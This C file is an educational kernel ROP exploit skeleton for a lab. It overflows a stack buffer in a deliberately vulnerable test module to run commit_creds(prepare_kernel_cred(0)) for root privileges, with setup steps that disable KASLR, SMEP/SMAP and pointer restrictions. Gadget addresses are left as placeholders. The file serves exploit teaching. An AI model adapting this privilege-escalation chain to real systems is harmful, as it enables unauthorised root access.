// exploit_skeleton.c â€” User-space driver for kROP lab (EDU ONLY)
// Goal: send oversized payload via write() to /dev/retalchemy to overflow kernel stack.
// This is a SKELETON; offsets/gadgets depend on your kernel build & defenses.
//
// Recommended lab setup:
//   - Run in VM (QEMU/KVM).
//   - Boot kernel with "nokaslr", CPU without SMEP/SMAP: -cpu qemu64,-smep,-smap
//   - Build module with frame pointers and no stack protector (see kmod Makefile).
//   - Optionally: echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
//   - Optionally: echo 0 | sudo tee /proc/sys/kernel/kptr_restrict
//
// Minimal kROP objective:
//   commit_creds(prepare_kernel_cred(NULL)); then return to usermode
//   Gadgets & symbol addrs must be resolved for your vmlinux (kallsyms).

#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>

#define DEV_PATH "/dev/retalchemy"
#define BUF_SZ   64   // kernel local buffer size in kmod
#define FP_SZ     8   // saved RBP size on x86-64
#define SLACK   128   // extra padding

// Fill these after resolving symbols (e.g., parse /proc/kallsyms in lab)
static uint64_t G_pop_rdi_ret   = 0x0; // gadget: pop rdi ; ret
static uint64_t G_mov_rax_ret   = 0x0; // optional helper
static uint64_t G_swapgs_iretq  = 0x0; // sequence to return to usermode, or use trampoline
static uint64_t sym_commit_creds = 0x0;
static uint64_t sym_prepare_kernel_cred = 0x0;

// Simple parser for /proc/kallsyms (requires kptr_restrict=0). Returns 0 if found.
static int resolve_kallsyms(const char* name, uint64_t* out)
{
    FILE* f = fopen("/proc/kallsyms", "r");
    if (!f) return -1;
    char sym[512], type;
    uint64_t addr;
    int found = -1;
    while (fscanf(f, "%llx %c %511s\n", &addr, &type, sym) == 3) {
        if (strcmp(sym, name) == 0) { *out = addr; found = 0; break; }
    }
    fclose(f);
    return found;
}

int main(void)
{
    int fd = open(DEV_PATH, O_WRONLY);
    if (fd < 0) {
        perror("open " DEV_PATH);
        return 1;
    }

    // Try resolve symbols (best-effort)
    resolve_kallsyms("commit_creds", &sym_commit_creds);
    resolve_kallsyms("prepare_kernel_cred", &sym_prepare_kernel_cred);
    fprintf(stderr, "[*] commit_creds=%p, prepare_kernel_cred=%p\n",
            (void*)sym_commit_creds, (void*)sym_prepare_kernel_cred);
    if (!sym_commit_creds || !sym_prepare_kernel_cred) {
        fprintf(stderr, "[!] Failed to resolve symbols (set kptr_restrict=0 or fill manually)\n");
    }
    if (!G_pop_rdi_ret) {
        fprintf(stderr, "[!] Fill G_pop_rdi_ret etc. with gadget addresses from vmlinux/module\n");
    }

    size_t off_saved_rbp = BUF_SZ;           // after local[64]
    size_t off_saved_rip = BUF_SZ + FP_SZ;   // after saved RBP
    size_t chain_start   = off_saved_rip;    // ROP starts at saved RIP

    size_t payload_len = chain_start + 8*12 + SLACK;
    uint8_t* p = calloc(1, payload_len);
    if (!p) { perror("calloc"); return 1; }

    // 1) Fill buffer (64B) + fake saved RBP (8B)
    memset(p, 'A', BUF_SZ);
    memset(p + off_saved_rbp, 'B', FP_SZ);

    // 2) ROP chain: commit_creds(prepare_kernel_cred(0)); then return safely
    size_t o = chain_start;

    // rdi = 0
    *(uint64_t*)(p + o) = G_pop_rdi_ret; o += 8;
    *(uint64_t*)(p + o) = 0;            o += 8;
    // rax = prepare_kernel_cred ; call rax (you may prefer ret2func directly)
    *(uint64_t*)(p + o) = sym_prepare_kernel_cred; o += 8; // assuming 'ret' into function works in your setup
    // move rdi = rax (need a gadget or ABI-respecting call/ret path)
    // For a skeleton we leave this conceptual; in practice find: mov rdi, rax ; ret
    // *(uint64_t*)(p + o) = G_mov_rdi_rax_ret; o += 8;

    // call commit_creds(rdi)
    *(uint64_t*)(p + o) = sym_commit_creds; o += 8;

    // Return-to-usermode trampoline (depends on kernel); placeholder:
    *(uint64_t*)(p + o) = G_swapgs_iretq; o += 8; // or pivot to a known-safe epilogue

    // Send it
    ssize_t wr = write(fd, p, payload_len);
    fprintf(stderr, "[*] wrote %zd bytes to %s\n", wr, DEV_PATH);
    if (wr < 0) perror("write");

    free(p);
    close(fd);
    return 0;
}

